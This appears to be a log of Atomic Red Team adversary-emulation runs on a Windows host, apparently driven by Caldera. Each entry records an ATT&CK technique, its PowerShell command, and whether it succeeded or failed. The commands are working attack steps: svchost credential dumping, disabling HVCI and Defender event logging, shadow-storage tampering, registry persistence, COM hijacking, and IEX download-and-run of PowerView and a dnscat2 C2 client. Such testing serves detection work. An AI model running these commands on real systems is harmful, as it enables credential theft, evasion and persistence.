atomic_ordering: ['f21623deb932dc0db3f00068ba15bf32']
------------------------------
{'ability_id': 'f21623deb932dc0db3f00068ba15bf32',
 'agent_reported_time': '2023-11-11T13:10:24Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1090.003',
            'technique_name': 'Proxy: Multi-hop Proxy'},
 'command': '& "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat"',
 'delegated': '2023-11-29T09:25:32Z',
 'description': 'Psiphon 3 is a circumvention tool from Psiphon Inc. that '
                'utilizes VPN, SSH and HTTP Proxy technology to provide you\n'
                'with uncensored access to Internet.\n'
                'This process will launch Psiphon 3 and establish a '
                'connection. Shortly after it will be shut down via process '
                'kill commands.\n'
                'More information can be found about Psiphon using the '
                'following urls\n'
                'http://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\n'
                'https://psiphon.ca/faq.html\n',
 'executor': 'psh',
 'link_id': 'ffd50715-691d-4309-8c60-499f175f5e9e',
 'name': 'Psiphon',
 'pid': 9520,
 'plaintext_command': '& "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat"',
 'platform': 'windows',
 'run': '2023-11-29T09:26:04Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1490__impact__inhibit_system_recovery__409acf7907007b041753a5f452b3df9b__trial_1

atomic_ordering: ['409acf7907007b041753a5f452b3df9b']
------------------------------
{'ability_id': '409acf7907007b041753a5f452b3df9b',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'impact',
            'technique_id': 'T1490',
            'technique_name': 'Inhibit System Recovery'},
 'command': 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%',
 'delegated': '2023-12-01T10:04:58Z',
 'description': 'Adversaries generally try to Resize Shadowstorage Volume '
                'using vssadmin.exe to avoid the shadow volumes being made '
                'again. This technique is typically found used by adversaries '
                'during a ransomware event and a precursor to deleting the '
                'shadowstorage.',
 'executor': 'psh',
 'link_id': 'fd25fec5-5c41-40a9-9084-60f1918c4a5e',
 'name': 'Windows - vssadmin Resize Shadowstorage Volume',
 'pid': 5520,
 'plaintext_command': 'vssadmin resize shadowstorage /For=C: /On=C: '
                      '/MaxSize=20%',
 'platform': 'windows',
 'run': '2023-12-01T10:05:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__ae1510936a20ac31014eb86e5b4944ce__trial_1

atomic_ordering: ['ae1510936a20ac31014eb86e5b4944ce']
------------------------------
{'ability_id': 'ae1510936a20ac31014eb86e5b4944ce',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.001',
            'technique_name': 'Signed Binary Proxy Execution: Compiled HTML '
                              'File'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHCompiledHelp -ExecuteShortcutCommand '
            '-InfoTechStorageHandler its -TopicExtension html -HHFilePath '
            '$env:windir\\hh.exe -CHMFilePath Test.chm',
 'delegated': '2023-11-30T19:32:34Z',
 'description': 'Executes a CHM file using the Shortcut Command method with a '
                'defined ITS Protocol Handler, and help topic extension.',
 'executor': 'psh',
 'link_id': 'e7b620b9-75f5-45a1-b9d8-938a3aa8279e',
 'name': 'Invoke CHM Shortcut Command with ITS and Help Topic',
 'pid': 8176,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHCompiledHelp '
                      '-ExecuteShortcutCommand -InfoTechStorageHandler its '
                      '-TopicExtension html -HHFilePath $env:windir\\hh.exe '
                      '-CHMFilePath Test.chm',
 'platform': 'windows',
 'run': '2023-11-30T19:33:20Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b97004a5d9c4283b6085ddf3ff0d6b4c__trial_1

atomic_ordering: ['b97004a5d9c4283b6085ddf3ff0d6b4c']
------------------------------
{'ability_id': 'b97004a5d9c4283b6085ddf3ff0d6b4c',
 'agent_reported_time': '2023-11-11T13:09:59Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'reg add '
            '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" '
            '/v "Enabled" /t REG_DWORD /d 0 /f',
 'delegated': '2023-12-03T12:27:47Z',
 'description': 'This test disables Hypervisor-Enforced Code Integrity (HVCI) '
                'by setting the registry key '
                'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity '
                '"Enabled" value to "0".\n'
                'The pre-req needs to be ran in order to setup HVCI and have '
                'it enabled. \n'
                'We do not recommend running this in production.\n'
                '[Black Lotus '
                'Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n'
                '[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n',
 'executor': 'psh',
 'link_id': '52933e0c-bb70-4ee9-a74a-442edd2538c4',
 'name': 'Disable Hypervisor-Enforced Code Integrity (HVCI)',
 'pid': 7444,
 'plaintext_command': 'reg add '
                      '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" '
                      '/v "Enabled" /t REG_DWORD /d 0 /f',
 'platform': 'windows',
 'run': '2023-12-03T12:27:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518__discovery__software_discovery__b5fe84fa9fb8216512867a039a61db20__trial_1

atomic_ordering: ['b5fe84fa9fb8216512867a039a61db20']
------------------------------
{'ability_id': 'b5fe84fa9fb8216512867a039a61db20',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1518',
            'technique_name': 'Software Discovery'},
 'command': 'Get-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* '
            '| Select-Object DisplayName, DisplayVersion, Publisher, '
            'InstallDate | Format-Table -Autosize; Get-ItemProperty '
            'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* '
            '| Select-Object DisplayName, DisplayVersion, Publisher, '
            'InstallDate | Format-Table -Autosize',
 'delegated': '2023-12-01T14:36:18Z',
 'description': 'Query the registry to determine software and versions '
                'installed on the system. Upon execution a table of\n'
                'software name and version information will be displayed.\n',
 'executor': 'psh',
 'link_id': '611c41db-25e0-44ff-aaaa-8d3191cfebbf',
 'name': 'Applications Installed',
 'pid': 8312,
 'plaintext_command': 'Get-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* '
                      '| Select-Object DisplayName, DisplayVersion, Publisher, '
                      'InstallDate | Format-Table -Autosize; Get-ItemProperty '
                      'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* '
                      '| Select-Object DisplayName, DisplayVersion, Publisher, '
                      'InstallDate | Format-Table -Autosize',
 'platform': 'windows',
 'run': '2023-12-01T14:36:38Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__f7257d271a176f7c609b4a33513d2eef__trial_1

atomic_ordering: ['f7257d271a176f7c609b4a33513d2eef']
------------------------------
{'ability_id': 'f7257d271a176f7c609b4a33513d2eef',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.004',
            'technique_name': 'Unsecured Credentials: Private Keys'},
 'command': '$mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force '
            '-AsPlainText; $cert = New-SelfSignedCertificate -DnsName '
            'atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; '
            'Set-Location Cert:\\LocalMachine\\My; Get-ChildItem -Path '
            '$cert.Thumbprint | Export-PfxCertificate -FilePath '
            '$env:Temp\\atomicredteam.pfx -Password $mypwd',
 'delegated': '2023-12-02T17:42:44Z',
 'description': 'Creates a Root certificate and exports it with '
                'Export-PFXCertificate PowerShell Cmdlet.\n'
                'Upon a successful attempt, this will write a pfx to disk and '
                'utilize the Cmdlet Export-PFXCertificate.\n',
 'executor': 'psh',
 'link_id': 'ae7c8120-e2ae-44b0-8e39-95dfa3cd4bf7',
 'name': 'Export Root Certificate with Export-PFXCertificate',
 'pid': 9200,
 'plaintext_command': '$mypwd = ConvertTo-SecureString -String "AtomicRedTeam" '
                      '-Force -AsPlainText; $cert = New-SelfSignedCertificate '
                      '-DnsName atomicredteam.com -CertStoreLocation '
                      'cert:\\LocalMachine\\My; Set-Location '
                      'Cert:\\LocalMachine\\My; Get-ChildItem -Path '
                      '$cert.Thumbprint | Export-PfxCertificate -FilePath '
                      '$env:Temp\\atomicredteam.pfx -Password $mypwd',
 'platform': 'windows',
 'run': '2023-12-02T17:43:00Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__03c8721619373b6c18a55721a33cad2c__trial_1

atomic_ordering: ['03c8721619373b6c18a55721a33cad2c']
------------------------------
{'ability_id': '03c8721619373b6c18a55721a33cad2c',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Find-LocalAdminAccess -Verbose',
 'delegated': '2023-11-28T12:28:17Z',
 'description': 'Find machines where user has local admin access (PowerView). '
                'Upon execution, progress and info about each host in the '
                'domain being scanned will be displayed.\n',
 'executor': 'psh',
 'link_id': '0589506e-1136-4d2e-a76b-879d9991d371',
 'name': 'Find machines where user has local admin access (PowerView)',
 'pid': 8432,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Find-LocalAdminAccess -Verbose',
 'platform': 'windows',
 'run': '2023-11-28T12:28:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__d91ba895a529dab873a22858cfdd3521__trial_1

atomic_ordering: ['d91ba895a529dab873a22858cfdd3521']
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__23000b943f18392d477ad7a1cad6586c__trial_1

atomic_ordering: ['23000b943f18392d477ad7a1cad6586c']
==============================
==============================
adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_1

atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
------------------------------
{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
 'agent_reported_time': '2023-11-11T13:10:37Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1003',
            'technique_name': 'OS Credential Dumping'},
 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
            '{$id = (Get-Process svchost)[0].Id }; '
            'C:\\Windows\\System32\\rundll32.exe '
            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
            '$env:TEMP\\svchost-exe.dmp full',
 'delegated': '2023-11-27T06:07:04Z',
 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
                'Source: '
                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
                '\n'
                'Upon successful execution, you should see the following file '
                'created $env:TEMP\\svchost-exe.dmp.\n',
 'executor': 'psh',
 'link_id': '218908f2-c46f-4139-9c3c-ceb587f9bd54',
 'name': 'Dump svchost.exe to gather RDP credentials',
 'pid': 5528,
 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
                      'Established -ErrorAction Ignore); if($ps){$id = '
                      '$ps[0].OwningProcess} else {$id = (Get-Process '
                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
                      '$env:TEMP\\svchost-exe.dmp full',
 'platform': 'windows',
 'run': '2023-11-27T06:08:12Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b__trial_1

atomic_ordering: ['81289b3d78d06c14b816f7644b1d9f8b']
------------------------------
{'ability_id': '81289b3d78d06c14b816f7644b1d9f8b',
 'agent_reported_time': '2023-11-11T13:09:00Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.001',
            'technique_name': 'Access Token Manipulation: Token '
                              'Impersonation/Theft'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe" '
            '-Argument "-U:T -P:E cmd"; Start-Sleep -Second 5; Stop-Process '
            '-Name "cmd" -force -erroraction silentlycontinue',
 'delegated': '2023-11-30T06:19:43Z',
 'description': 'Launches the NSudo executable for a short period of time and '
                'then exits.\n'
                'NSudo download observed after maldoc execution. NSudo is a '
                'system management tool for advanced users to launch programs '
                'with full privileges.',
 'executor': 'psh',
 'link_id': '36e58b0d-c36e-448f-81c5-8cbd9cc3f558',
 'name': 'Launch NSudo Executable',
 'pid': 10792,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe" '
                      '-Argument "-U:T -P:E cmd"; Start-Sleep -Second 5; '
                      'Stop-Process -Name "cmd" -force -erroraction '
                      'silentlycontinue',
 'platform': 'windows',
 'run': '2023-11-30T06:20:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__7cd5d1852fb4a534fa9b735288ca158f__trial_1

atomic_ordering: ['7cd5d1852fb4a534fa9b735288ca158f']
------------------------------
{'ability_id': '7cd5d1852fb4a534fa9b735288ca158f',
 'agent_reported_time': '2023-11-11T13:10:50Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.004',
            'technique_name': 'Boot or Logon Autostart Execution: Winlogon '
                              'Helper DLL'},
 'command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\" "Shell" "explorer.exe, '
            'C:\\Windows\\System32\\cmd.exe" -Force',
 'delegated': '2023-12-02T05:22:27Z',
 'description': 'PowerShell code to set Winlogon shell key to execute a binary '
                'at logon along with explorer.exe.\n'
                '\n'
                'Upon successful execution, PowerShell will modify a registry '
                'value to execute cmd.exe upon logon/logoff.\n',
 'executor': 'psh',
 'link_id': 'b52a0a24-e248-4d0e-8e4b-0ac54f741f13',
 'name': 'Winlogon Shell Key Persistence - PowerShell',
 'pid': 9748,
 'plaintext_command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\" "Shell" "explorer.exe, '
                      'C:\\Windows\\System32\\cmd.exe" -Force',
 'platform': 'windows',
 'run': '2023-12-02T05:23:23Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1204_003__execution__user_execution-_malicious_image__b939c81cba750f4b3ef67e6b0456b41e__trial_1

atomic_ordering: ['b939c81cba750f4b3ef67e6b0456b41e']
------------------------------
{'ability_id': 'b939c81cba750f4b3ef67e6b0456b41e',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.003',
            'technique_name': 'User Execution: Malicious Image'},
 'command': 'IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" '
            '-OutFile "$env:TEMP\\qbot-test.iso"); Mount-DiskImage -ImagePath '
            '"$env:TEMP\\qbot-test.iso"; $mountedpath = (Get-DiskImage '
            '-ImagePath "$env:TEMP\\qbot-test.iso" | Get-Volume).DriveLetter; '
            '$finalpath = $mountedpath + ":\\"; cd $finalpath; .\\calc.exe.lnk',
 'delegated': '2023-11-30T17:16:09Z',
 'description': 'Adversaries may rely on a user running a malicious image to '
                'facilitate execution',
 'executor': 'psh',
 'link_id': '11b385fd-5eab-4d1b-bdb3-86babe3235ca',
 'name': 'Malicious Execution from Mounted ISO Image',
 'pid': 2456,
 'plaintext_command': 'IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" '
                      '-OutFile "$env:TEMP\\qbot-test.iso"); Mount-DiskImage '
                      '-ImagePath "$env:TEMP\\qbot-test.iso"; $mountedpath = '
                      '(Get-DiskImage -ImagePath "$env:TEMP\\qbot-test.iso" | '
                      'Get-Volume).DriveLetter; $finalpath = $mountedpath + '
                      '":\\"; cd $finalpath; .\\calc.exe.lnk',
 'platform': 'windows',
 'run': '2023-11-30T17:16:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__3c8ae3452b200f3509b14463df78068c__trial_1

atomic_ordering: ['3c8ae3452b200f3509b14463df78068c']
------------------------------
{'ability_id': '3c8ae3452b200f3509b14463df78068c',
 'agent_reported_time': '2023-11-11T13:10:06Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.015',
            'technique_name': 'Event Triggered Execution: Component Object '
                              'Model Hijacking'},
 'command': 'New-Item -Path '
            "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' "
            "-Value 'MSAA AccPropServices'; New-Item -Path "
            "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' "
            '-Value '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll"; '
            'New-ItemProperty -Path '
            "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' "
            "-Name 'ThreadingModel' -Value 'Apartment' -PropertyType "
            '"String"; Start-Process -FilePath '
            '"C:\\Windows\\System32\\RUNDLL32.EXE" -ArgumentList \'-sta '
            "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
 'delegated': '2023-12-01T21:43:14Z',
 'description': 'This test uses PowerShell to hijack a reference to a '
                'Component Object Model by creating registry values under '
                'InprocServer32 key in the HKCU hive then calling the Class ID '
                'to be executed via rundll32.exe.\n'
                '\n'
                'Reference: '
                'https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/',
 'executor': 'psh',
 'link_id': 'b28de6cf-8995-4a4f-8226-7c2a98015de9',
 'name': 'COM Hijacking - InprocServer32',
 'pid': 8972,
 'plaintext_command': 'New-Item -Path '
                      "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' "
                      "-Value 'MSAA AccPropServices'; New-Item -Path "
                      "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' "
                      '-Value '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll"; '
                      'New-ItemProperty -Path '
                      "'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' "
                      "-Name 'ThreadingModel' -Value 'Apartment' -PropertyType "
                      '"String"; Start-Process -FilePath '
                      '"C:\\Windows\\System32\\RUNDLL32.EXE" -ArgumentList '
                      "'-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",
 'platform': 'windows',
 'run': '2023-12-01T21:43:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1057__discovery__process_discovery__1ddf2b8ee6a56ce9f9132a168947653e__trial_1

atomic_ordering: ['1ddf2b8ee6a56ce9f9132a168947653e']
------------------------------
{'ability_id': '1ddf2b8ee6a56ce9f9132a168947653e',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1057',
            'technique_name': 'Process Discovery'},
 'command': 'get-wmiObject -class Win32_Process',
 'delegated': '2023-11-28T04:44:00Z',
 'description': 'Utilize get-wmiObject PowerShell cmdlet to identify '
                'processes.\n'
                '\n'
                'Upon successful execution, powershell.exe will execute '
                'get-wmiObject to list processes. Output will be via '
                'stdout. \n',
 'executor': 'psh',
 'link_id': '6c336066-8743-4923-858e-c4708aca2e0b',
 'name': 'Process Discovery - get-wmiObject',
 'pid': 10636,
 'plaintext_command': 'get-wmiObject -class Win32_Process',
 'platform': 'windows',
 'run': '2023-11-28T04:44:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_014__multiple__active_setup__b45598708fd9e5b197cb58cf193f4778__trial_1

atomic_ordering: ['b45598708fd9e5b197cb58cf193f4778']
==============================
==============================
adversary_id: atomic__t1071_004__command-and-control__application_layer_protocol-_dns__bda00f459bb9118c4c88de426055e180__trial_1

atomic_ordering: ['bda00f459bb9118c4c88de426055e180']
------------------------------
{'ability_id': 'bda00f459bb9118c4c88de426055e180',
 'agent_reported_time': '2023-11-11T13:09:38Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1071.004',
            'technique_name': 'Application Layer Protocol: DNS'},
 'command': 'IEX (New-Object '
            "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); "
            'Start-Dnscat2 -Domain',
 'delegated': '2023-11-28T22:09:17Z',
 'description': 'This will attempt to start a C2 session using the DNS '
                'protocol. You will need to have a listener set up and create '
                'DNS records prior to executing this command.\n'
                'The following blogs have more information.\n'
                '\n'
                'https://github.com/iagox86/dnscat2\n'
                '\n'
                'https://github.com/lukebaggett/dnscat2-powershell\n',
 'executor': 'psh',
 'link_id': '9d8df3c9-44a7-4b1e-8d71-e76c7bfedf85',
 'name': 'DNS C2',
 'pid': 11120,
 'plaintext_command': 'IEX (New-Object '
                      "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); "
                      'Start-Dnscat2 -Domain',
 'platform': 'windows',
 'run': '2023-11-28T22:09:26Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1115__collection__clipboard_data__8c0f619c7dfd33907bf20b1dfb58022b__trial_1

atomic_ordering: ['8c0f619c7dfd33907bf20b1dfb58022b']
------------------------------
{'ability_id': '8c0f619c7dfd33907bf20b1dfb58022b',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1115',
            'technique_name': 'Clipboard Data'},
 'command': 'echo Get-Process | clip; Get-Clipboard | iex',
 'delegated': '2023-11-30T02:48:46Z',
 'description': 'Utilize PowerShell to echo a command to clipboard and execute '
                'it\n',
 'executor': 'psh',
 'link_id': '809d4c5b-4dbc-4cdd-a5c0-200dd04a0c22',
 'name': 'Execute Commands from Clipboard using PowerShell',
 'pid': 2564,
 'plaintext_command': 'echo Get-Process | clip; Get-Clipboard | iex',
 'platform': 'windows',
 'run': '2023-11-30T02:49:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277__trial_1

atomic_ordering: ['9b3194cc656092b09f4d79ba3d3a3277']
------------------------------
{'ability_id': '9b3194cc656092b09f4d79ba3d3a3277',
 'agent_reported_time': '2023-11-11T13:10:32Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1553.005',
            'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass'},
 'command': 'Mount-DiskImage -ImagePath "0f959a_FeelTheBurn.iso" -StorageType '
            'ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel '
            '"TestIso"; $driveLetter = ($keep | Get-Volume).DriveLetter; '
            'invoke-item "$($driveLetter):\\hello.exe"',
 'delegated': '2023-12-02T20:38:00Z',
 'description': 'Mounts an ISO image downloaded from internet to evade '
                'Mark-of-the-Web and run hello.exe executable from the ISO. \n'
                'Upon successful execution, powershell will download the .iso '
                'from the Atomic Red Team repo, mount the image, and run the '
                'executable from the ISO image that will open command prompt '
                'echoing "Hello, World!". \n'
                'ISO provided '
                'by:https://twitter.com/mattifestation/status/1398323532988399620 '
                'Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ',
 'executor': 'psh',
 'link_id': '0c76ef95-393c-4f86-8c30-49a9d930ee34',
 'name': 'Mount an ISO image and run executable from the ISO',
 'pid': 6480,
 'plaintext_command': 'Mount-DiskImage -ImagePath "0f959a_FeelTheBurn.iso" '
                      '-StorageType ISO -Access ReadOnly; $keep = Get-Volume '
                      '-FileSystemLabel "TestIso"; $driveLetter = ($keep | '
                      'Get-Volume).DriveLetter; invoke-item '
                      '"$($driveLetter):\\hello.exe"',
 'platform': 'windows',
 'run': '2023-12-02T20:39:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__54ef63765cf80243f370958bcf738338__trial_1

atomic_ordering: ['54ef63765cf80243f370958bcf738338']
------------------------------
{'ability_id': '54ef63765cf80243f370958bcf738338',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.006',
            'technique_name': 'Impair Defenses: Indicator Blocking'},
 'command': 'New-ItemProperty '
            '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows '
            'Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 '
            '-Force',
 'delegated': '2023-12-03T17:18:31Z',
 'description': 'An adversary can disable the ETW Provider of Windows '
                'Defender,\n'
                'so nothing would be logged to '
                'Microsoft-Windows-Windows-Defender/Operational anymore.\n'
                'https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n',
 'executor': 'psh',
 'link_id': '1841e750-23ab-40b0-ad13-8362cada09c0',
 'name': 'LockBit Black - Disable the ETW Provider of Windows Defender '
         '-Powershell',
 'pid': 8424,
 'plaintext_command': 'New-ItemProperty '
                      '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows '
                      'Defender/Operational" -Name Enabled  -PropertyType '
                      'DWord -Value 0 -Force',
 'platform': 'windows',
 'run': '2023-12-03T17:18:51Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_013__multiple__event_triggered_execution-_powershell_profile__49a7502f9c667aa3af9c87f6ab1e68b3__trial_1

atomic_ordering: ['49a7502f9c667aa3af9c87f6ab1e68b3']
------------------------------
{'ability_id': '49a7502f9c667aa3af9c87f6ab1e68b3',
 'agent_reported_time': '2023-11-11T13:10:50Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.013',
            'technique_name': 'Event Triggered Execution: PowerShell Profile'},
 'command': 'Add-Content $profile -Value ""; Add-Content $profile -Value '
            '"Start-Process calc.exe"; powershell -Command exit',
 'delegated': '2023-12-01T21:03:56Z',
 'description': "Appends a start process cmdlet to the current user's "
                'powershell profile pofile that points to a malicious '
                'executable. Upon execution, calc.exe will be launched.\n',
 'executor': 'psh',
 'link_id': 'be87bb84-fa32-44b6-8821-4c43187b34bc',
 'name': 'Append malicious start-process cmdlet',
 'pid': 9172,
 'plaintext_command': 'Add-Content $profile -Value ""; Add-Content $profile '
                      '-Value "Start-Process calc.exe"; powershell -Command '
                      'exit',
 'platform': 'windows',
 'run': '2023-12-01T21:04:48Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1033__discovery__system_owner,user_discovery__cfcf66cc85109ad2ebdb301d619fa41f__trial_1

atomic_ordering: ['cfcf66cc85109ad2ebdb301d619fa41f']
------------------------------
{'ability_id': 'cfcf66cc85109ad2ebdb301d619fa41f',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1033',
